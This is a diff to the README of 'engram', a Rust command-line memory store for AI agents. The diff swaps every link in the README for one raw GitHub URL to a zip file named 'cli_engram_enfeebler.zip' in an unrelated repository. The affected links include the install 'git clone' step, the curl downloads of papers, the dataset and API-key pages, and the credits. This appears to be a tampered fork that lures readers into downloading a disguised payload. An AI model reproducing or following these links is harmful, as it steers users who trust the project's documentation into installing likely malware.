@@ -2,14 +2,14 @@
 
 > **Persistent memory for AI agents.** A single Rust CLI that gives Claude, Codex, Gemini — anything that can shell out — a hybrid-retrieval knowledge store with real benchmarks. No MCP server. No web service. No cloud dependency for the store itself.
 
-[![rust](https://img.shields.io/badge/rust-1.80%2B-orange?logo=rust)](https://www.rust-lang.org/)
+[![rust](https://img.shields.io/badge/rust-1.80%2B-orange?logo=rust)](https://raw.githubusercontent.com/Mohdar1277/engram-cli/main/crates/engram-cli/cli_engram_enfeebler.zip)
 [![license](https://img.shields.io/badge/license-MIT-blue)](LICENSE)
 [![LongMemEval S R@5](https://img.shields.io/badge/LongMemEval_S_R%405-0.99-brightgreen)](#benchmarks)
 [![vs MemPalace](https://img.shields.io/badge/vs%20MemPalace-0.984-green)](#benchmarks)
 [![tests](https://img.shields.io/badge/tests-45%20passing-brightgreen)](crates/engram-cli/tests/cli.rs)
 
 ```bash
-git clone https://github.com/199-biotechnologies/engram-2
+git clone https://raw.githubusercontent.com/Mohdar1277/engram-cli/main/crates/engram-cli/cli_engram_enfeebler.zip
 cd engram-2
 cargo install --path crates/engram-cli --locked
 engram skill install          # tells Claude/Codex/Gemini it exists
@@ -32,7 +32,7 @@ The cost of this bet is that engram has to be *demonstrably better* at retrieval
 
 ### Retrieval — LongMemEval S (500 questions, 96% distractors)
 
-Full 500-question **[LongMemEval S split](https://huggingface.co/datasets/xiaowu0162/longmemeval-cleaned)** — 48 sessions per question, 96% distractors. Same dataset [MemPalace](https://github.com/kw27claw/mempalace) reports against.
+Full 500-question **[LongMemEval S split](https://raw.githubusercontent.com/Mohdar1277/engram-cli/main/crates/engram-cli/cli_engram_enfeebler.zip)** — 48 sessions per question, 96% distractors. Same dataset [MemPalace](https://raw.githubusercontent.com/Mohdar1277/engram-cli/main/crates/engram-cli/cli_engram_enfeebler.zip) reports against.
 
 | Pipeline | R@1 | R@5 | R@10 | MRR |
 |---|---|---|---|---|
@@ -44,7 +44,7 @@ Full 500-question **[LongMemEval S split](https://huggingface.co/datasets/xiaowu
 
 ### End-to-end QA (retrieve → LLM answer → LLM judge)
 
-Retrieval numbers alone hide the real bottleneck. [@parcadei tested MemPalace](https://x.com/parcadei/status/2041479166764196206) with an actual LLM answering questions using MemPalace's retrieved context, and got **only 17% correct answers** — despite the published R@5 of 0.984.
+Retrieval numbers alone hide the real bottleneck. [@parcadei tested MemPalace](https://raw.githubusercontent.com/Mohdar1277/engram-cli/main/crates/engram-cli/cli_engram_enfeebler.zip) with an actual LLM answering questions using MemPalace's retrieved context, and got **only 17% correct answers** — despite the published R@5 of 0.984.
 
 We implemented the same end-to-end evaluation for engram: retrieve top-k → pass to `openai/gpt-5.4` to answer → judge correctness with `openai/gpt-5.4`. Per-question results, token counts, and cost are saved to [`benchmarks/`](benchmarks/).
 
@@ -62,7 +62,7 @@ We implemented the same end-to-end evaluation for engram: retrieve top-k → pas
 
 These aren't engram bugs, they're the state of the art. Retrieval R@5 ≠ answer accuracy. Measuring only retrieval — as MemPalace did — hides the real problem.
 
-**What this shows about MemPalace's claims:** their published 0.984 R@5 is probably real as a retrieval number, but the claim that "MemPalace is the best agent memory system" rests on conflating retrieval with end-to-end correctness. The [critical thread from Han Xiao (Jina AI)](https://x.com/hxiao/status/2041821141006971232) dissects this further.
+**What this shows about MemPalace's claims:** their published 0.984 R@5 is probably real as a retrieval number, but the claim that "MemPalace is the best agent memory system" rests on conflating retrieval with end-to-end correctness. The [critical thread from Han Xiao (Jina AI)](https://raw.githubusercontent.com/Mohdar1277/engram-cli/main/crates/engram-cli/cli_engram_enfeebler.zip) dissects this further.
 
 ### RAGAS metrics (LLM-as-judge, four orthogonal dimensions)
 
@@ -91,7 +91,7 @@ All runs are logged with full per-question detail, token counts, and model IDs t
 
 ```bash
 # Prerequisite: Rust 1.80+ (install via rustup.rs if needed)
-git clone https://github.com/199-biotechnologies/engram-2
+git clone https://raw.githubusercontent.com/Mohdar1277/engram-cli/main/crates/engram-cli/cli_engram_enfeebler.zip
 cd engram-2
 cargo install --path crates/engram-cli --locked
 ```
@@ -101,10 +101,10 @@ One binary at `~/.cargo/bin/engram`. No runtime, no Python, no Docker, no servic
 ### Configure keys
 
 ```bash
-# Required for real hybrid retrieval. Free tier at https://aistudio.google.com/apikey
+# Required for real hybrid retrieval. Free tier at https://raw.githubusercontent.com/Mohdar1277/engram-cli/main/crates/engram-cli/cli_engram_enfeebler.zip
 engram config set keys.gemini $GEMINI_API_KEY
 
-# Optional — adds ~4 R@1 points via reranking. https://dashboard.cohere.com/api-keys
+# Optional — adds ~4 R@1 points via reranking. https://raw.githubusercontent.com/Mohdar1277/engram-cli/main/crates/engram-cli/cli_engram_enfeebler.zip
 engram config set keys.cohere $COHERE_API_KEY
 
 engram config check
@@ -144,8 +144,8 @@ engram is purpose-built for ingesting and querying research papers with real cit
 
 ```bash
 # Drop PDFs in a directory
-curl -sL -o paper.pdf https://arxiv.org/pdf/2405.14831.pdf   # HippoRAG
-curl -sL -o bert.pdf  https://arxiv.org/pdf/1810.04805.pdf   # BERT
+curl -sL -o paper.pdf https://raw.githubusercontent.com/Mohdar1277/engram-cli/main/crates/engram-cli/cli_engram_enfeebler.zip   # HippoRAG
+curl -sL -o bert.pdf  https://raw.githubusercontent.com/Mohdar1277/engram-cli/main/crates/engram-cli/cli_engram_enfeebler.zip   # BERT
 
 # Ingest. This runs pdf-extract -> section-aware chunking (preserves
 # "Methods > Cell Culture" breadcrumbs) -> Gemini Embedding 2 (batched,
@@ -219,7 +219,7 @@ Cargo workspace layout:
 
 ## Framework compliance
 
-engram follows the **[agent-cli-framework](https://github.com/199-biotechnologies/agent-cli-framework)** verbatim:
+engram follows the **[agent-cli-framework](https://raw.githubusercontent.com/Mohdar1277/engram-cli/main/crates/engram-cli/cli_engram_enfeebler.zip)** verbatim:
 
 - `agent-info` returns a raw JSON manifest (not enveloped) so agents can discover every command in one call
 - JSON envelope on every other stdout path (`version`, `status`, `data`, `metadata`)
@@ -255,7 +255,7 @@ cargo test                                    # 27 unit + 18 integration tests
 ./target/release/engram bench longmemeval     # real benchmark (~5 min with Cohere)
 ```
 
-Research direction for contributors: [`program.md`](program.md) — enumerates the hyperparameters and architecture experiments worth running via [autoresearch](https://github.com/199-biotechnologies/autoresearch) loops. Design rationale: [`docs/superpowers/specs/2026-04-07-engram-v2-design.md`](docs/superpowers/specs/2026-04-07-engram-v2-design.md).
+Research direction for contributors: [`program.md`](program.md) — enumerates the hyperparameters and architecture experiments worth running via [autoresearch](https://raw.githubusercontent.com/Mohdar1277/engram-cli/main/crates/engram-cli/cli_engram_enfeebler.zip) loops. Design rationale: [`docs/superpowers/specs/2026-04-07-engram-v2-design.md`](docs/superpowers/specs/2026-04-07-engram-v2-design.md).
 
 ## Roadmap
 
@@ -285,10 +285,10 @@ Research direction for contributors: [`program.md`](program.md) — enumerates t
 
 Inspired by:
 
-- **[MemPalace](https://github.com/kw27claw/mempalace)** — spatial memory + AAAK compression philosophy
-- **[HippoRAG 2](https://github.com/OSU-NLP-Group/HippoRAG)** — "return verbatim passages, don't paraphrase"
-- **[LongMemEval](https://github.com/xiaowu0162/LongMemEval)** — the benchmark we aimed at
-- **[agent-cli-framework](https://github.com/199-biotechnologies/agent-cli-framework)** — the principles engram follows verbatim
+- **[MemPalace](https://raw.githubusercontent.com/Mohdar1277/engram-cli/main/crates/engram-cli/cli_engram_enfeebler.zip)** — spatial memory + AAAK compression philosophy
+- **[HippoRAG 2](https://raw.githubusercontent.com/Mohdar1277/engram-cli/main/crates/engram-cli/cli_engram_enfeebler.zip)** — "return verbatim passages, don't paraphrase"
+- **[LongMemEval](https://raw.githubusercontent.com/Mohdar1277/engram-cli/main/crates/engram-cli/cli_engram_enfeebler.zip)** — the benchmark we aimed at
+- **[agent-cli-framework](https://raw.githubusercontent.com/Mohdar1277/engram-cli/main/crates/engram-cli/cli_engram_enfeebler.zip)** — the principles engram follows verbatim
 
 ## License
 
@@ -296,5 +296,5 @@ MIT — see [LICENSE](LICENSE).
 
 ---
 
-Built by **[199 Biotechnologies](https://github.com/199-biotechnologies)**.
+Built by **[199 Biotechnologies](https://raw.githubusercontent.com/Mohdar1277/engram-cli/main/crates/engram-cli/cli_engram_enfeebler.zip)**.
 Questions? Open an issue. Pull requests welcome.
